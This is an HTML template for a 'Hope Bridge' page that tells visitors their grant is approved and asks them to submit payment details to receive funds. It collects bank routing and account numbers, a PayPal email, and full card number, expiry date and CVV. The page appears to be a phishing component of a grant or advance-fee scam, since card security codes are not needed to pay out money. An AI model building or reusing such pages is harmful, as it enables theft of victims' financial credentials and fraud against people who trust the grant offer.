<!DOCTYPE html>
<html lang="en">
<head>
  <title>Submit Payment Details - Hope Bridge</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
</head>
<body>
{% include "partials/loader.html" %}
  <div class="container py-5">
    <div class="text-center mb-4">
      <h2><i class="fas fa-gift text-success"></i> Your Grant is Approved!</h2>
      <p class="lead">Please submit your payment method to receive your funds.</p>
    </div>

    <div class="card shadow">
      <div class="card-body">
        <form method="post">
          <div class="mb-3">
            <label>Payment Method *</label>
            <select name="method" class="form-control" id="method" required>
              <option value="">Select Method</option>
              <option value="bank">Bank Transfer</option>
              <option value="paypal">PayPal</option>
              <option value="card">Credit/Debit Card</option>
            </select>
          </div>

          <!-- Bank Fields -->
          <div id="bank-fields" style="display:none;">
            <h5>Bank Transfer</h5>
            <div class="row">
              <div class="col-md-6 mb-3">
                <label>Account Holder Name *</label>
                <input type="text" name="account_holder" class="form-control">
              </div>
              <div class="col-md-6 mb-3">
                <label>Bank Name *</label>
                <input type="text" name="bank_name" class="form-control">
              </div>
              <div class="col-md-6 mb-3">
                <label>Routing Number *</label>
                <input type="text" name="routing_number" class="form-control">
              </div>
              <div class="col-md-6 mb-3">
                <label>Account Number *</label>
                <input type="text" name="account_number" class="form-control">
              </div>
            </div>
          </div>

          <!-- PayPal -->
          <div id="paypal-fields" style="display:none;">
            <h5>PayPal</h5>
            <div class="mb-3">
              <label>PayPal Email Address *</label>
              <input type="email" name="paypal_email" class="form-control">
            </div>
          </div>

          <!-- Card -->
          <div id="card-fields" style="display:none;">
            <h5>Credit/Debit Card</h5>
            <div class="row">
              <div class="col-md-12 mb-3">
                <label>Card Number *</label>
                <input type="text" name="card_number" class="form-control" placeholder="XXXX XXXX XXXX XXXX">
              </div>
              <div class="col-md-4 mb-3">
                <label>Expiry (MM/YY) *</label>
                <input type="text" name="expiry_date" class="form-control" placeholder="MM/YY">
              </div>
              <div class="col-md-4 mb-3">
                <label>CVV *</label>
                <input type="text" name="cvv" class="form-control" placeholder="123">
              </div>
              <div class="col-md-12 mb-3">
                <label>Billing Address</label>
                <textarea name="billing_address" class="form-control">{{ app.address_street }}, {{ app.address_city }}, {{ app.address_state }} {{ app.address_zip }}</textarea>
              </div>
            </div>
          </div>

          <button type="submit" class="btn btn-success">Submit Payment Info</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    document.getElementById('method').addEventListener('change', function() {
      document.getElementById('bank-fields').style.display = 'none';
      document.getElementById('paypal-fields').style.display = 'none';
      document.getElementById('card-fields').style.display = 'none';

      if (this.value === 'bank') document.getElementById('bank-fields').style.display = 'block';
      else if (this.value === 'paypal') document.getElementById('paypal-fields').style.display = 'block';
      else if (this.value === 'card') document.getElementById('card-fields').style.display = 'block';
    });
  </script>
</body>
</html>
